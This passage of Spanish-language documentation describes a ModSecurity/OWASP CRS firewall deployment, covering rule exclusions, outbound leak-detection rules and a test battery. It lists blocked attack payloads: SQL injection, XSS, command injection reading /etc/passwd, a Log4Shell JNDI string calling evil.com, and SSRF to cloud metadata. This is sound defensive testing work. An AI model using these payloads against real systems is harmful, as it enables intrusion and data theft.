    ctl:ruleRemoveById=941100-941999   ← XSS (HTML/JS del dashboard)
    ctl:ruleRemoveById=942100-942999   ← SQLi (datos SQL en la interfaz)
    ctl:ruleRemoveById=951100-951999   ← SQL info leakage (outbound)
    ctl:ruleRemoveById=952100-952999   ← Data leakage (rutas de ficheros)
    ctl:ruleRemoveById=953100-953999   ← PHP/Java info leakage
    ctl:ruleRemoveById=954100-954999   ← Application errors
    ctl:ruleRemoveById=10010-10013     ← Reglas custom de exfiltración
</pre></div>
</div>
<p><strong>Justificación</strong>: en producción, el supervisor debe estar desactivado (<code class="docutils literal notranslate"><span class="pre">APP_SUPERVISOR=0</span></code>), por lo que esta exclusión no aplica. Se usa <code class="docutils literal notranslate"><span class="pre">ctl:ruleRemoveById</span></code> para eliminar familias de reglas concretas en lugar de <code class="docutils literal notranslate"><span class="pre">ctl:ruleEngine=Off</span></code>, cumpliendo el requisito de no desactivar el motor del WAF por completo.</p>
</section>
</section>
<hr class="docutils" />
<section id="proteccion-contra-exfiltracion-de-datos-outbound-filtering">
<h2>6. Protección contra exfiltración de datos (Outbound Filtering)<a class="headerlink" href="#proteccion-contra-exfiltracion-de-datos-outbound-filtering" title="Link to this heading">¶</a></h2>
<section id="id1">
<h3>Configuración<a class="headerlink" href="#id1" title="Link to this heading">¶</a></h3>
<p>El WAF inspecciona el cuerpo de las respuestas para detectar fugas de información sensible:</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">SecResponseBodyAccess</span> <span class="n">On</span>
<span class="n">SecResponseBodyMimeType</span> <span class="n">text</span><span class="o">/</span><span class="n">plain</span> <span class="n">text</span><span class="o">/</span><span class="n">html</span> <span class="n">text</span><span class="o">/</span><span class="n">xml</span> <span class="n">application</span><span class="o">/</span><span class="n">json</span>
<span class="n">SecResponseBodyLimit</span> <span class="mi">524288</span>
</pre></div>
</div>
<ul class="simple">
<li><p><strong><code class="docutils literal notranslate"><span class="pre">SecResponseBodyAccess</span> <span class="pre">On</span></code></strong>: activa la inspección de respuestas.</p></li>
<li><p><strong><code class="docutils literal notranslate"><span class="pre">SecResponseBodyMimeType</span></code></strong>: tipos MIME inspeccionados (incluye JSON para la API REST).</p></li>
<li><p><strong><code class="docutils literal notranslate"><span class="pre">SecResponseBodyLimit</span></code></strong>: límite de 512 KB por respuesta para no impactar excesivamente el rendimiento.</p></li>
</ul>
</section>
<section id="reglas-crs-de-respuesta-automaticas">
<h3>Reglas CRS de respuesta (automáticas)<a class="headerlink" href="#reglas-crs-de-respuesta-automaticas" title="Link to this heading">¶</a></h3>
<p>Con el outbound filtering activado, las reglas CRS de las familias 950xxx-954xxx se activan automáticamente:</p>
<div class="table-wrapper colwidths-auto docutils container">
<table class="docutils align-default">
<thead>
<tr class="row-odd"><th class="head"><p>Familia</p></th>
<th class="head"><p>Descripción</p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td><p>951xxx</p></td>
<td><p>SQL Information Leakage (errores SQL en respuestas)</p></td>
</tr>
<tr class="row-odd"><td><p>952xxx</p></td>
<td><p>Data Leakage (listados de directorios, rutas de ficheros)</p></td>
</tr>
<tr class="row-even"><td><p>953xxx</p></td>
<td><p>PHP/Java Information Leakage</p></td>
</tr>
<tr class="row-odd"><td><p>954xxx</p></td>
<td><p>Application Error Messages (stack traces genéricos)</p></td>
</tr>
</tbody>
</table>
</div>
</section>
<section id="reglas-personalizadas-de-exfiltracion">
<h3>Reglas personalizadas de exfiltración<a class="headerlink" href="#reglas-personalizadas-de-exfiltracion" title="Link to this heading">¶</a></h3>
<p>Se han añadido 4 reglas personalizadas que complementan las reglas CRS:</p>
<div class="table-wrapper colwidths-auto docutils container">
<table class="docutils align-default">
<thead>
<tr class="row-odd"><th class="head"><p>ID</p></th>
<th class="head"><p>Detección</p></th>
<th class="head"><p>Ejemplo de patrón</p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td><p><strong>10010</strong></p></td>
<td><p>Números de tarjeta de crédito (Visa, MasterCard, AMEX, Discover)</p></td>
<td><p><code class="docutils literal notranslate"><span class="pre">4539578763621486</span></code></p></td>
</tr>
<tr class="row-odd"><td><p><strong>10011</strong></p></td>
<td><p>Contenido de <code class="docutils literal notranslate"><span class="pre">/etc/passwd</span></code></p></td>
<td><p><code class="docutils literal notranslate"><span class="pre">root:x:0:0:root:/root:/bin/bash</span></code></p></td>
</tr>
<tr class="row-even"><td><p><strong>10012</strong></p></td>
<td><p>Volcados de base de datos</p></td>
<td><p><code class="docutils literal notranslate"><span class="pre">CREATE</span> <span class="pre">TABLE</span></code>, <code class="docutils literal notranslate"><span class="pre">INSERT</span> <span class="pre">INTO</span></code>, <code class="docutils literal notranslate"><span class="pre">mysqldump</span></code></p></td>
</tr>
<tr class="row-odd"><td><p><strong>10013</strong></p></td>
<td><p>Stack traces de Python/Flask</p></td>
<td><p><code class="docutils literal notranslate"><span class="pre">Traceback</span> <span class="pre">(most</span> <span class="pre">recent</span> <span class="pre">call</span> <span class="pre">last)</span></code>, <code class="docutils literal notranslate"><span class="pre">Debugger</span> <span class="pre">PIN</span></code></p></td>
</tr>
</tbody>
</table>
</div>
</section>
<section id="pruebas-de-exfiltracion-realizadas">
<h3>Pruebas de exfiltración realizadas<a class="headerlink" href="#pruebas-de-exfiltracion-realizadas" title="Link to this heading">¶</a></h3>
<p>Se crearon endpoints de test (<code class="docutils literal notranslate"><span class="pre">/test/exfiltration/*</span></code>, solo disponibles en modo desarrollo) que simulan fugas de datos. El WAF bloquea correctamente todas:</p>
<div class="table-wrapper colwidths-auto docutils container">
<table class="docutils align-default">
<thead>
<tr class="row-odd"><th class="head"><p>Endpoint</p></th>
<th class="head"><p>Regla activada</p></th>
<th class="head"><p>Resultado en log</p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">/test/exfiltration/passwd</span></code></p></td>
<td><p>10011</p></td>
<td><p><code class="docutils literal notranslate"><span class="pre">Access</span> <span class="pre">denied</span> <span class="pre">with</span> <span class="pre">code</span> <span class="pre">403</span> <span class="pre">(phase</span> <span class="pre">4).</span> <span class="pre">msg:</span> <span class="pre">'Posible</span> <span class="pre">fuga</span> <span class="pre">de</span> <span class="pre">contenido</span> <span class="pre">de</span> <span class="pre">/etc/passwd</span> <span class="pre">en</span> <span class="pre">respuesta'</span></code></p></td>
</tr>
<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">/test/exfiltration/creditcard</span></code></p></td>
<td><p>10010</p></td>
<td><p><code class="docutils literal notranslate"><span class="pre">Access</span> <span class="pre">denied</span> <span class="pre">with</span> <span class="pre">code</span> <span class="pre">403</span> <span class="pre">(phase</span> <span class="pre">4).</span> <span class="pre">msg:</span> <span class="pre">'Posible</span> <span class="pre">fuga</span> <span class="pre">de</span> <span class="pre">número</span> <span class="pre">de</span> <span class="pre">tarjeta</span> <span class="pre">de</span> <span class="pre">crédito</span> <span class="pre">en</span> <span class="pre">respuesta'</span></code></p></td>
</tr>
<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">/test/exfiltration/sqldump</span></code></p></td>
<td><p>10012</p></td>
<td><p><code class="docutils literal notranslate"><span class="pre">Access</span> <span class="pre">denied</span> <span class="pre">with</span> <span class="pre">code</span> <span class="pre">403</span> <span class="pre">(phase</span> <span class="pre">4).</span> <span class="pre">msg:</span> <span class="pre">'Posible</span> <span class="pre">volcado</span> <span class="pre">de</span> <span class="pre">base</span> <span class="pre">de</span> <span class="pre">datos</span> <span class="pre">en</span> <span class="pre">respuesta'</span></code></p></td>
</tr>
<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">/test/exfiltration/stacktrace</span></code></p></td>
<td><p>10013</p></td>
<td><p><code class="docutils literal notranslate"><span class="pre">Access</span> <span class="pre">denied</span> <span class="pre">with</span> <span class="pre">code</span> <span class="pre">403</span> <span class="pre">(phase</span> <span class="pre">4).</span> <span class="pre">msg:</span> <span class="pre">'Posible</span> <span class="pre">fuga</span> <span class="pre">de</span> <span class="pre">stack</span> <span class="pre">trace</span> <span class="pre">o</span> <span class="pre">debugger</span> <span class="pre">de</span> <span class="pre">Python</span> <span class="pre">en</span> <span class="pre">respuesta'</span></code></p></td>
</tr>
</tbody>
</table>
</div>
<p><strong>Extracto real del log (tarjeta de crédito bloqueada):</strong></p>
<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span>
<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;request&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;GET&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;uri&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/test/exfiltration/creditcard&quot;</span><span class="p">},</span>
<span class="w">    </span><span class="nt">&quot;response&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;http_code&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">403</span><span class="p">},</span>
<span class="w">    </span><span class="nt">&quot;producer&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;secrules_engine&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Enabled&quot;</span><span class="p">},</span>
<span class="w">    </span><span class="nt">&quot;messages&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[{</span>
<span class="w">      </span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Posible fuga de número de tarjeta de crédito en respuesta&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="nt">&quot;details&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nt">&quot;ruleId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;10010&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;match&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Matched Operator Rx against variable RESPONSE_BODY&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;4539578763621486&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;severity&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;tags&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;DATA_LEAKAGE/CREDIT_CARD&quot;</span><span class="p">]</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">    </span><span class="p">}]</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>
</section>
<section id="nota-sobre-el-comportamiento-en-reverse-proxy">
<h3>Nota sobre el comportamiento en reverse proxy<a class="headerlink" href="#nota-sobre-el-comportamiento-en-reverse-proxy" title="Link to this heading">¶</a></h3>
<p>Cuando una regla de fase 4 (outbound) se activa, ModSecurity intenta devolver un 403 al cliente. En modo reverse proxy, los headers HTTP pueden haberse enviado ya al cliente antes de que se inspeccione el body. En ese caso:</p>
<ul class="simple">
<li><p>El log registra <code class="docutils literal notranslate"><span class="pre">header</span> <span class="pre">already</span> <span class="pre">sent</span></code> como advertencia.</p></li>
<li><p>ModSecurity <strong>cierra la conexión</strong>, truncando la respuesta.</p></li>
<li><p>El cliente recibe una respuesta incompleta o un error de conexión, impidiendo la exfiltración completa.</p></li>
</ul>
</section>
</section>
<hr class="docutils" />
<section id="ataques-bloqueados-bateria-de-pruebas-verificada">
<h2>7. Ataques bloqueados (batería de pruebas verificada)<a class="headerlink" href="#ataques-bloqueados-bateria-de-pruebas-verificada" title="Link to this heading">¶</a></h2>
<section id="extracto-real-del-log-sql-injection-detectada-modo-detectiononly">
<h3>Extracto real del log — SQL Injection detectada (modo DetectionOnly)<a class="headerlink" href="#extracto-real-del-log-sql-injection-detectada-modo-detectiononly" title="Link to this heading">¶</a></h3>
<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span>
<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;request&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;GET&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="nt">&quot;uri&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/?id=1%20OR%201=1&quot;</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nt">&quot;producer&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nt">&quot;modsecurity&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;ModSecurity v3.0.14 (Linux)&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="nt">&quot;secrules_engine&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;DetectionOnly&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="nt">&quot;components&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;OWASP_CRS/4.23.0&quot;</span><span class="p">]</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nt">&quot;messages&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[{</span>
<span class="w">      </span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;SQL Injection Attack Detected via libinjection&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="nt">&quot;details&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nt">&quot;ruleId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;942100&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;file&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;REQUEST-942-APPLICATION-ATTACK-SQLI.conf&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Matched Data: 1&amp;1 found within ARGS:id: 1 OR 1=1&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;severity&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;tags&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;attack-sqli&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;paranoia-level/1&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;OWASP_CRS&quot;</span><span class="p">]</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">    </span><span class="p">},</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Inbound Anomaly Score Exceeded (Total Score: 5)&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="nt">&quot;details&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nt">&quot;ruleId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;949110&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;TX:BLOCKING_INBOUND_ANOMALY_SCORE = 5&quot;</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">    </span><span class="p">}]</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>
</section>
<section id="extracto-real-del-log-xss-detectada-modo-detectiononly">
<h3>Extracto real del log — XSS detectada (modo DetectionOnly)<a class="headerlink" href="#extracto-real-del-log-xss-detectada-modo-detectiononly" title="Link to this heading">¶</a></h3>
<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span>
<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;request&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;GET&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="nt">&quot;uri&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/?x=&lt;script&gt;alert(1)&lt;/script&gt;&quot;</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nt">&quot;messages&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">      </span><span class="p">{</span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;XSS Attack Detected via libinjection&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;details&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;ruleId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;941100&quot;</span><span class="p">}},</span>
<span class="w">      </span><span class="p">{</span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;XSS Filter - Category 1: Script Tag Vector&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;details&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;ruleId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;941110&quot;</span><span class="p">}},</span>
<span class="w">      </span><span class="p">{</span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;NoScript XSS InjectionChecker: HTML Injection&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;details&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;ruleId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;941160&quot;</span><span class="p">}},</span>
<span class="w">      </span><span class="p">{</span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Javascript method detected&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;details&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;ruleId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;941390&quot;</span><span class="p">}},</span>
<span class="w">      </span><span class="p">{</span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Inbound Anomaly Score Exceeded (Total Score: 20)&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;details&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;ruleId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;949110&quot;</span><span class="p">}}</span>
<span class="w">    </span><span class="p">]</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>
</section>
<section id="extracto-real-del-log-command-injection-lfi-modo-detectiononly">
<h3>Extracto real del log — Command Injection / LFI (modo DetectionOnly)<a class="headerlink" href="#extracto-real-del-log-command-injection-lfi-modo-detectiononly" title="Link to this heading">¶</a></h3>
<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span>
<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;request&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;GET&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="nt">&quot;uri&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/?cmd=;cat%20/etc/passwd&quot;</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nt">&quot;messages&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
<span class="w">      </span><span class="p">{</span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;OS File Access Attempt&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;details&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;ruleId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;930120&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;etc/passwd found within ARGS:cmd&quot;</span><span class="p">}},</span>
<span class="w">      </span><span class="p">{</span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Remote Command Execution: Unix Shell Code Found&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;details&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;ruleId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;932160&quot;</span><span class="p">}},</span>
<span class="w">      </span><span class="p">{</span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Inbound Anomaly Score Exceeded (Total Score: 10)&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;details&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;ruleId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;949110&quot;</span><span class="p">}}</span>
<span class="w">    </span><span class="p">]</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>
</section>
<section id="extracto-real-del-log-scanner-detectado-modo-detectiononly">
<h3>Extracto real del log — Scanner detectado (modo DetectionOnly)<a class="headerlink" href="#extracto-real-del-log-scanner-detectado-modo-detectiononly" title="Link to this heading">¶</a></h3>
<div class="highlight-json notranslate"><div class="highlight"><pre><span></span><span class="p">{</span>
<span class="w">  </span><span class="nt">&quot;transaction&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;request&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">      </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;GET&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;uri&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="nt">&quot;headers&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span><span class="nt">&quot;User-Agent&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Nikto&quot;</span><span class="p">}</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nt">&quot;messages&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[{</span>
<span class="w">      </span><span class="nt">&quot;message&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Found User-Agent associated with security scanner&quot;</span><span class="p">,</span>
<span class="w">      </span><span class="nt">&quot;details&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nt">&quot;ruleId&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;913100&quot;</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;data&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Matched Data: nikto found within REQUEST_HEADERS:User-Agent: Nikto&quot;</span>
<span class="w">      </span><span class="p">}</span>
<span class="w">    </span><span class="p">}]</span>
<span class="w">  </span><span class="p">}</span>
<span class="p">}</span>
</pre></div>
</div>
</section>
<section id="tabla-resumen-modo-on-bloqueo-activo">
<h3>Tabla resumen — Modo On (bloqueo activo)<a class="headerlink" href="#tabla-resumen-modo-on-bloqueo-activo" title="Link to this heading">¶</a></h3>
<section id="inyeccion-sql">
<h4>Inyección SQL<a class="headerlink" href="#inyeccion-sql" title="Link to this heading">¶</a></h4>
<div class="table-wrapper colwidths-auto docutils container">
<table class="docutils align-default">
<thead>
<tr class="row-odd"><th class="head"><p>Payload</p></th>
<th class="head"><p>Vector</p></th>
<th class="head"><p>HTTP</p></th>
<th class="head"><p>Estado</p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">?id=1</span> <span class="pre">OR</span> <span class="pre">1=1</span></code></p></td>
<td><p>Query string</p></td>
<td><p>403</p></td>
<td><p>Bloqueado</p></td>
</tr>
<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">?q=1</span> <span class="pre">UNION</span> <span class="pre">SELECT</span> <span class="pre">username,password</span> <span class="pre">FROM</span> <span class="pre">users</span></code></p></td>
<td><p>Query string</p></td>
<td><p>403</p></td>
<td><p>Bloqueado</p></td>
</tr>
</tbody>
</table>
</div>
</section>
<section id="cross-site-scripting-xss">
<h4>Cross-Site Scripting (XSS)<a class="headerlink" href="#cross-site-scripting-xss" title="Link to this heading">¶</a></h4>
<div class="table-wrapper colwidths-auto docutils container">
<table class="docutils align-default">
<thead>
<tr class="row-odd"><th class="head"><p>Payload</p></th>
<th class="head"><p>Vector</p></th>
<th class="head"><p>HTTP</p></th>
<th class="head"><p>Estado</p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">&lt;script&gt;alert(1)&lt;/script&gt;</span></code></p></td>
<td><p>Query string</p></td>
<td><p>403</p></td>
<td><p>Bloqueado</p></td>
</tr>
<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">&lt;img</span> <span class="pre">src=x</span> <span class="pre">onerror=alert(1)&gt;</span></code></p></td>
<td><p>Query string</p></td>
<td><p>403</p></td>
<td><p>Bloqueado</p></td>
</tr>
<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">&lt;svg</span> <span class="pre">onload=alert(1)&gt;</span></code></p></td>
<td><p>Query string</p></td>
<td><p>403</p></td>
<td><p>Bloqueado</p></td>
</tr>
</tbody>
</table>
</div>
</section>
<section id="inyeccion-de-comandos-lfi">
<h4>Inyección de comandos / LFI<a class="headerlink" href="#inyeccion-de-comandos-lfi" title="Link to this heading">¶</a></h4>
<div class="table-wrapper colwidths-auto docutils container">
<table class="docutils align-default">
<thead>
<tr class="row-odd"><th class="head"><p>Payload</p></th>
<th class="head"><p>Vector</p></th>
<th class="head"><p>HTTP</p></th>
<th class="head"><p>Estado</p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">?cmd=;cat</span> <span class="pre">/etc/passwd</span></code></p></td>
<td><p>Query string</p></td>
<td><p>403</p></td>
<td><p>Bloqueado</p></td>
</tr>
<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">?x=|ls</span> <span class="pre">-la</span></code></p></td>
<td><p>Query string</p></td>
<td><p>403</p></td>
<td><p>Bloqueado</p></td>
</tr>
</tbody>
</table>
</div>
</section>
<section id="ataques-de-protocolo-aplicacion">
<h4>Ataques de protocolo / aplicación<a class="headerlink" href="#ataques-de-protocolo-aplicacion" title="Link to this heading">¶</a></h4>
<div class="table-wrapper colwidths-auto docutils container">
<table class="docutils align-default">
<thead>
<tr class="row-odd"><th class="head"><p>Payload</p></th>
<th class="head"><p>Vector</p></th>
<th class="head"><p>HTTP</p></th>
<th class="head"><p>Estado</p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td><p>Header <code class="docutils literal notranslate"><span class="pre">${jndi:ldap://evil.com/x}</span></code></p></td>
<td><p>Cabecera (Log4Shell)</p></td>
<td><p>403</p></td>
<td><p>Bloqueado</p></td>
</tr>
<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">?url=http://169.254.169.254/latest/meta-data/</span></code></p></td>
<td><p>SSRF (metadata AWS)</p></td>
<td><p>403</p></td>
<td><p>Bloqueado</p></td>
</tr>
</tbody>
</table>
</div>
</section>
<section id="deteccion-de-scanners">
<h4>Detección de scanners<a class="headerlink" href="#deteccion-de-scanners" title="Link to this heading">¶</a></h4>
<div class="table-wrapper colwidths-auto docutils container">
<table class="docutils align-default">
<thead>
<tr class="row-odd"><th class="head"><p>Payload</p></th>
<th class="head"><p>Vector</p></th>
<th class="head"><p>HTTP</p></th>
<th class="head"><p>Estado</p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td><p><code class="docutils literal notranslate"><span class="pre">User-Agent:</span> <span class="pre">Nikto</span></code></p></td>
<td><p>Cabecera</p></td>
<td><p>403</p></td>
<td><p>Bloqueado</p></td>
</tr>
<tr class="row-odd"><td><p><code class="docutils literal notranslate"><span class="pre">User-Agent:</span> <span class="pre">sqlmap/1.5</span></code></p></td>
<td><p>Cabecera</p></td>
<td><p>403</p></td>
<td><p>Bloqueado</p></td>
</tr>
</tbody>
</table>
</div>
</section>
<section id="exfiltracion-de-datos-outbound">
<h4>Exfiltración de datos (outbound)<a class="headerlink" href="#exfiltracion-de-datos-outbound" title="Link to this heading">¶</a></h4>
<div class="table-wrapper colwidths-auto docutils container">
<table class="docutils align-default">
<thead>
<tr class="row-odd"><th class="head"><p>Tipo de fuga</p></th>
<th class="head"><p>Regla</p></th>
<th class="head"><p>HTTP</p></th>
<th class="head"><p>Estado</p></th>
</tr>
</thead>
<tbody>
<tr class="row-even"><td><p>Números de tarjeta de crédito</p></td>
<td><p>10010</p></td>
<td><p>403</p></td>
<td><p>Bloqueado</p></td>
</tr>
